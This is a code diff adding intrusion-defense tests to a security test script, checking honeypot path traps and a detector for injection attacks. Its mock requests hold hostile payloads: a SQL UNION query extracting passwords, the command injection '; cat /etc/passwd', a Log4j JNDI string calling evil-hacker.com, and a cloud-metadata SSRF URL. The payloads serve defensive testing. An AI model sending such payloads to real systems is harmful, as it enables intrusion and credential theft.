@@ -53,6 +53,50 @@ assert(rulesContent.includes('match /auth_otps/{otpId} {\n      allow read, writ
 assert(rulesContent.includes('match /auth_sessions/{sessionId} {\n      allow read, write: if false;'), 'Sessions collection denied');
 console.log('✔ Confirmed: Client access to auth_credentials, auth_otps, and auth_sessions is completely blocked');
 
+console.log('\n--- [Security Test 3: 0-Day Intrusion Shield & Honeypot Tarpit Inspection] ---');
+import { isHoneypotScanPath, inspectPayloadForZeroDayAttacks } from '../server/securityDefense.ts';
+
+// 1. Verify Honeypots
+assert.strictEqual(isHoneypotScanPath('/.env'), true, '/.env must trigger honeypot trap');
+assert.strictEqual(isHoneypotScanPath('/.git/config'), true, '/.git/config must trigger honeypot trap');
+assert.strictEqual(isHoneypotScanPath('/wp-login.php'), true, '/wp-login.php must trigger honeypot trap');
+assert.strictEqual(isHoneypotScanPath('/phpmyadmin'), true, '/phpmyadmin must trigger honeypot trap');
+assert.strictEqual(isHoneypotScanPath('/actuator/health'), true, '/actuator/health must trigger honeypot trap');
+assert.strictEqual(isHoneypotScanPath('/api/apps'), false, 'Legitimate /api/apps must NOT trigger honeypot');
+assert.strictEqual(isHoneypotScanPath('/sitemap.xml'), false, 'Legitimate /sitemap.xml must NOT trigger honeypot');
+console.log('✔ Confirmed: Honeypot matrix traps exploit scanners and allows legitimate routes');
+
+// 2. Verify 0-Day Injection Detectors
+const sqliMockReq: any = { originalUrl: '/api/apps?q=1%20UNION%20SELECT%20null,null,password%20FROM%20users' };
+const sqliCheck = inspectPayloadForZeroDayAttacks(sqliMockReq);
+assert.strictEqual(sqliCheck.detected, true, 'SQL injection probe must be intercepted');
+assert.strictEqual(sqliCheck.attackType, 'sql_injection');
+console.log('✔ Confirmed: SQL Injection 0-day probe intercepted');
+
+const rceMockReq: any = { body: { command: '; cat /etc/passwd' } };
+const rceCheck = inspectPayloadForZeroDayAttacks(rceMockReq);
+assert.strictEqual(rceCheck.detected, true, 'RCE command injection must be intercepted');
+assert.strictEqual(rceCheck.attackType, 'remote_code_execution');
+console.log('✔ Confirmed: Remote Code Execution probe intercepted');
+
+const jndiMockReq: any = { headers: { 'user-agent': '${jndi:ldap://evil-hacker.com/exploit}' } };
+const jndiCheck = inspectPayloadForZeroDayAttacks(jndiMockReq);
+assert.strictEqual(jndiCheck.detected, true, 'Log4j JNDI probe must be intercepted');
+assert.strictEqual(jndiCheck.attackType, 'jndi_log4j');
+console.log('✔ Confirmed: Log4j / JNDI zero-day probe intercepted');
+
+const ssrfMockReq: any = { originalUrl: '/api/resolve-apk?url=http://169.254.169.254/latest/meta-data/' };
+const ssrfCheck = inspectPayloadForZeroDayAttacks(ssrfMockReq);
+assert.strictEqual(ssrfCheck.detected, true, 'Cloud metadata SSRF must be intercepted');
+assert.strictEqual(ssrfCheck.attackType, 'metadata_ssrf');
+console.log('✔ Confirmed: Cloud Metadata SSRF probe intercepted');
+
+const legitMockReq: any = { originalUrl: '/api/apps?category=utilities&search=vlc%20player' };
+const legitCheck = inspectPayloadForZeroDayAttacks(legitMockReq);
+assert.strictEqual(legitCheck.detected, false, 'Legitimate search query must not be flagged');
+console.log('✔ Confirmed: Zero false-positives on legitimate catalog requests');
+
 console.log('\n==========================================');
-console.log('🎉 ALL SECURITY REMEDIATION TESTS PASSED!');
+console.log('🎉 ALL SECURITY & INTRUSION DEFENSE TESTS PASSED!');
 console.log('==========================================\n');
+
